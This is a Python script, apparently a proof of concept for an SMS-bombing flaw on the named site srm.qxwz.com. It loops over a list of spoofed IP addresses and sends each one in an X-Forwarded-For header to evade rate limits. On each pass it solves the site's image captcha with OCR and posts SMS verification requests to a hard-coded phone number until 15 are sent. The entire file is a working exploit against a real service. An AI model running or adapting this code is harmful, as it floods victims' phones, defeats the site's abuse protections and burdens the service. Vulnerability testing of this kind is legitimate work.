import json
import random
import string
import time

import requests
import urllib3
import ddddocr
from PIL import Image
from io import BytesIO

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)


def do():
    target_url = "https://srm.qxwz.com/"
    register_mobile = "13888888888"
    success_num = 0
    ip_list = []
    with open('../fuzz/ip.txt', 'r') as file:
        for line in file:
            # 去除行尾的换行符并添加到列表中
            ip_list.append(line.rstrip('\n'))

    ocr = ddddocr.DdddOcr(show_ad=False)

    for ip in ip_list:
        acw_tc = generate_acw_tc()
        device_id = generate_device_id()
        headers1 = {
            "Host": "srm.qxwz.com",
            "Accept": "image/avif,image/webp,image/apng,image/svg+xml,image/*,*/*;q=0.8",
            "Accept-Encoding": "gzip, deflate, br",
            "Accept-Language": "zh-CN,zh;q=0.9",
            "Cookie": "sensorsdata2015jssdkcross=%7B%22distinct_id%22%3A%22188dd0a275f2c4-0f2646ef7ec55a8-26031d51-1338645-188dd0a276034a%22%2C%22first_id%22%3A%22%22%2C%22props%22%3A%7B%22%24latest_traffic_source_type%22%3A%22%E5%BC%95%E8%8D%90%E6%B5%81%E9%87%8F%22%2C%22%24latest_search_keyword%22%3A%22%E6%9C%AA%E5%8F%96%E5%88%B0%E5%80%BC%22%2C%22%24latest_referrer%22%3A%22https%3A%2F%2Fsrm.wz-inc.com%2F%22%2C%22%24latest_landing_page%22%3A%22https%3A%2F%2Fsrm.qxwz.com%2F%23%2Fhome%2Fdashboard-v1%22%7D%2C%22identities%22%3A%22eyIkaWRlbnRpdHlfY29va2llX2lkIjoiMTg4ZGQwYTI3NWYyYzQtMGYyNjQ2ZWY3ZWM1NWE4LTI2MDMxZDUxLTEzMzg2NDUtMTg4ZGQwYTI3NjAzNGEifQ%3D%3D%22%2C%22history_login_id%22%3A%7B%22name%22%3A%22%22%2C%22value%22%3A%22%22%7D%2C%22%24device_id%22%3A%22" + device_id + "%22%7D; JSESSIONID=cohtCUlHVPhCU-Gp_NC2yF0lfUElHtu3f_7dCqDC",
            "Referer": "https://srm.qxwz.com/page.html",
            "Sec-Fetch-Dest": "image",
            "Sec-Fetch-Mode": "no-cors",
            "Sec-Fetch-Site": "same-origin",
            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.0.0 Safari/537.36",
            "dnt": "1",
            "sec-ch-ua": '"Not.A/Brand";v="8", "Chromium";v="114", "Google Chrome";v="114"',
            "sec-ch-ua-mobile": "?0",
            "sec-ch-ua-platform": '"Windows"',
            "sec-gpc": "1",
            "X-Forwarded-For": ip,
        }
        r1 = requests.get(url=target_url + "/code/image?t=1687677913629", timeout=5, verify=False, headers=headers1)
        image_code = ocr.classification(r1.content)
        # print(image_code)
        # 将响应的二进制内容转换为 Image 对象
        # image = Image.open(BytesIO(r1.content))
        # 保存为 JPEG 图片
        # image.save('./tmp/output.jpg', 'JPEG')

        # 发送短信
        headers2 = {
            "Host": "srm.qxwz.com",
            "Accept": "application/json, text/plain, */*",
            "Accept-Encoding": "gzip, deflate, br",
            "Accept-Language": "zh-CN,zh;q=0.9",
            "Content-Length": "52",
            "Content-Type": "application/json",
            "Cookie": "sensorsdata2015jssdkcross=%7B%22distinct_id%22%3A%22188dd0a275f2c4-0f2646ef7ec55a8-26031d51-1338645-188dd0a276034a%22%2C%22first_id%22%3A%22%22%2C%22props%22%3A%7B%22%24latest_traffic_source_type%22%3A%22%E5%BC%95%E8%8D%90%E6%B5%81%E9%87%8F%22%2C%22%24latest_search_keyword%22%3A%22%E6%9C%AA%E5%8F%96%E5%88%B0%E5%80%BC%22%2C%22%24latest_referrer%22%3A%22https%3A%2F%2Fsrm.wz-inc.com%2F%22%2C%22%24latest_landing_page%22%3A%22https%3A%2F%2Fsrm.qxwz.com%2F%23%2Fhome%2Fdashboard-v1%22%7D%2C%22identities%22%3A%22eyIkaWRlbnRpdHlfY29va2llX2lkIjoiMTg4ZGQwYTI3NWYyYzQtMGYyNjQ2ZWY3ZWM1NWE4LTI2MDMxZDUxLTEzMzg2NDUtMTg4ZGQwYTI3NjAzNGEifQ%3D%3D%22%2C%22history_login_id%22%3A%7B%22name%22%3A%22%22%2C%22value%22%3A%22%22%7D%2C%22%24device_id%22%3A%22" + device_id + "%22%7D; JSESSIONID=cohtCUlHVPhCU-Gp_NC2yF0lfUElHtu3f_7dCqDC",
            "Origin": "https://srm.qxwz.com",
            "Referer": "https://srm.qxwz.com/page.html",
            "Sec-Fetch-Dest": "empty",
            "Sec-Fetch-Mode": "cors",
            "Sec-Fetch-Site": "same-origin",
            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.0.0 Safari/537.36",
            "sec-ch-ua": '"Not.A/Brand";v="8", "Chromium";v="114", "Google Chrome";v="114"',
            "sec-ch-ua-mobile": "?0",
            "sec-ch-ua-platform": '"Windows"',
            "sec-gpc": "1",
            "X-Forwarded-For": ip,
        }
        sms_body = '{"imageCode":"' + image_code + '","registerMobile":"' + register_mobile + '"}'
        # print(sms_body)
        r2 = requests.post(url=target_url + "code/sms", data=sms_body, headers=headers2, timeout=5, verify=False)
        if 'captchaToken' in r2.text:
            success_num = success_num + 1
            print('发送成功：累计发送：' + str(success_num))
        else:
            print('发送失败：' + r2.text)
        if success_num >= 15:
            print("测试成功发送15条信息，存在短信轰炸漏洞！")
            break
        time.sleep(1)


def generate_acw_tc():
    characters = string.ascii_lowercase + string.digits
    acw_tc = ''.join(random.choices(characters, k=62))
    return acw_tc


def generate_device_id():
    data = []

    # 生成四个由字母和数字组成的 16 位字符串
    for _ in range(4):
        segment = ''.join(random.choices(string.ascii_lowercase + string.digits, k=16))
        data.append(segment)

    # 使用连字符连接四个字符串并返回
    return '-'.join(data)


if __name__ == "__main__":
    do()
